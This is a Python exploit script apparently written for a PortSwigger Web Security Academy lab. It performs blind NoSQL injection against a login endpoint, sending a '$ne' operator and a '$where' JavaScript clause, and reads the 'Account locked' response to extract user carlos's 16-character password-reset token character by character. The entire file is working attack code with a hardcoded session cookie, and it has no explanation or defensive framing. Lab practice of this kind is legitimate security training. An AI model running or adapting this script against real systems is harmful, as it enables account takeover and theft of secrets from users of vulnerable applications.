#!/usr/bin/env python3
import requests
import string
import sys

url = "https://0ac0009404a041e98218797d00cb006e.web-security-academy.net/login"
headers = {
    "Cookie": "session=CInUWYnpHEMIbjBVttgAfw3X7oTxjSRc",
    "Content-Type": "application/json"
}

# Token is 16 characters
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
token = ""

print("Extracting 16 character token...")
print("Progress: ", end="")

for position in range(16):
    found = False
    for char in charset:
        payload = {
            "username": "carlos",
            "password": {"$ne": "invalid"},
            "$where": f"this.resetPwdToken && this.resetPwdToken[{position}] == '{char}'"
        }

        response = requests.post(url, headers=headers, json=payload)
        if "Account locked" in response.text:
            token += char
            print(char, end="")
            sys.stdout.flush()
            found = True
            break

    if not found:
        print(f"\nCould not find character at position {position}")
        break

print(f"\n\nCarlos' resetPwdToken: {token}")